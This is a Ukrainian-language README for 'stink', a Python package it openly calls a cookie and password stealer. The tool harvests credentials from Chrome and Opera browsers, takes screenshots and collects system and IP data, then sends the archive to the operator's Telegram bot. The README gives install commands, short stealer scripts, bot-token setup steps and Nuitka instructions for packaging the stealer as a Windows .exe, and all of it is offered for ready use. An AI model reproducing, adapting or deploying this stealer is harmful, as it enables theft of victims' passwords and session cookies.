[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)

# stink

Стіллер кукі та паролів всього лише в 2 рядки. Відправлення в Telegram.

## Опис
`stink` в даний момент тільки починає свій розвиток. У майбутньому його функціонал буде розширено.

## Навігація
* [Поточні можливості](#Поточні-можливості)
* [Майбутні можливості](#Майбутні-можливості)
* [Встановлення](#Встановлення)
* [Приклад використання](#Приклад-використання)
  * [Стандартний](#Стандартний)
  * [Кастомний](#Кастомний)
* [Налаштування Telegram бота](#Налаштування-Telegram-бота)
  * [Отримання токена](#Отримання-токена)
  * [Отримання айді](#Отримання-айді)
* [Створення exe](#Створення-exe)
  * [Створення виконуваного файла](#Створення-виконуваного-файла)
  * [CMD](#CMD)

### Поточні можливості
1. Збір кукі та паролів наступних браузерів: Chrome, Opera, Opera GX.
2. Відправлення зібраних даних архівом в Telegram.
3. Виконання в окремому потоці.
4. Скріншот екрану.
5. Збір інформації про систему.
6. Збір айпі та інше.

### Майбутні можливості
1. Підтримка інших браузерів.
 
## Встановлення

Встановити останню версію можна командою:
```
pip install stink==0.0.5
```

## Приклад використання
### Стандартний
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
Для включення виводу помилок додайте параметр `errors=True`.

Стандартний ```Stealer``` запускає збір з усіх доступних браузерів і відправляє зібрані дані архівом вам в Telegram.

### Кастомний
```python
from os import mkdir
from getpass import getuser

from stink.browsers.chrome import Chrome
from stink.modules.sender import Sender

user = getuser()

zip_name = f"{user}-st"
storage_path = f"C:/Users/{user}/AppData/"
storage_folder = "files/"


def main():

    mkdir(storage_path + storage_folder)

    Chrome(storage_path, storage_folder, False).run()
    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()


if __name__ == "__main__":
    main()
```
В кастомному стіллері потрібно самому прописувати необхідні браузери і шлях для зберігання зібраних даних. Модуль ```Sender``` запакує всі файли в архів і відправить його вам в Telegram.

## Налаштування Telegram бота
### Отримання токена
1. Відкриваємо чат з [BotFather](https://t.me/botfather).
2. Прописуємо команду ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Прописуємо назву бота, далі нік з прикладкою ```_bot``` в кінці.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Отриманий токен вставляємо в поле ```"YOUR_TOKEN"``` в скрипті.

### Отримання айді
1. Відкриваємо чат з [Get My ID](https://t.me/getmyid_bot).
2. Прописуємо команду ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Отриманий айді вставляємо в поле ```YOUR_ID``` в скрипті.

## Створення exe
Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C++, а потім скомпілюємо в .exe файл.
Для цього нам знадобиться Nuitka.

### Створення виконуваного файла

Створюємо test.py (або будь-яку іншу назву) файл з наступним кодом:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Відкриваємо `cmd`.
2. Прописуємо команду:
```
pip install virtualenv
```
3. Переходимо в папку з файлом `test.py`:
```
cd path\to\file
```
4. Створюємо віртуальне оточення і активуємо його:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Встановлюємо Nuitka і Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==0.0.5
```
6. У створеній папці venv переходимо по шляху `\Lib\site-packages\win32\`.
7. Копіюємо файл `win32crypt.pyd`.
8. Вставляємо по шляху `\Lib\site-packages\`.
9. Повертаємося до `cmd` і прописуємо команду:
```
nuitka --onefile --include-package=stink test.py
```

Після виконання команди отримуємо test.exe файл.
